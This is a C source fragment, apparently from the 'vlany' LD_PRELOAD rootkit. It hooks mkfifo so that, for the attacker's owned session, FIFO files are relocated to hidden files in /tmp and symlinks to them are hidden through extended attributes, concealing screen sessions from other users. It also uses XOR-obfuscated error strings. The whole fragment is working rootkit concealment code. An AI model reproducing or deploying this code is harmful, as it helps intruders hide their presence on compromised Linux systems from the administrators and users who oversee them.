// since we can't apply extended attributes to special FIFO files,
// we intercept the call and drop the FIFO file in /tmp/ as a hidden file (regular files starting with ".")
// then create a symlink to the new FIFO file where mkfifo was originally going to create it's FIFO file.
// the new FIFO files are stil visible to regular users if they ls -a /tmp,
// but the symlinks are hidden so they won't show up in /run/screens/S-*/

// TODO:
//   - add cleanup function (remove FIFO file and symlink)

int mkfifo(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] mkfifo() called\n");
    #endif

    HOOK(old_mkfifo, CMKFIFO);
    if(owned())
    {
        // mkfifo(*different, temporary file*, mode)
        // use char *pathname to create symbolic link to new fifo file
        // hide symbolic link

        char buf[128], fname[256], loc[] = "/tmp/.XXXXXX";

        // use mkstemp to generate a random file name for the FIFO file
        int tmp = mkstemp(loc);
        if(tmp < 0) return -1;
        // get absolute path of our new temp file from the fd given
        snprintf(buf, sizeof(buf), "/proc/self/fd/%d", tmp);
        readlink(buf, fname, sizeof(fname));
        // now we need to remove the temp file we created. thats ok since we have the path in memory
        HOOK(old_unlink, CUNLINK); old_unlink(fname);

        // create a FIFO file in place of where our temp file was. path can't already exist,
        // hence earlier unlink
        if(old_mkfifo(fname, mode) < 0)
        {
            char *fifo_err = strdup(FIFO_ERR); xor(fifo_err);
            printf("%s", fifo_err); CLEAN(fifo_err);
            return -1;
        } // new fifo file should now be created, now we can link it
          // to the original designated path

        HOOK(old_symlink, CSYMLINK);
        if(old_symlink(fname, pathname) < 0) // create link to our FIFO file
        {
            char *ln_err = strdup(LN_ERR); xor(ln_err);
            printf(ln_err, pathname); CLEAN(ln_err);
            return -1;
        } // now we need to hide the link so regular users can't see it

        if(modify_xattr(pathname, 1) < 0) // hide our new link to the FIFO file
        {
            char *x_err = strdup(X_ERR); xor(x_err);
            printf(x_err, pathname); CLEAN(x_err);
            return -1;
        }

        // return success value as if everything worked normally
        return 0;
    }

    return old_mkfifo(pathname, mode);
}
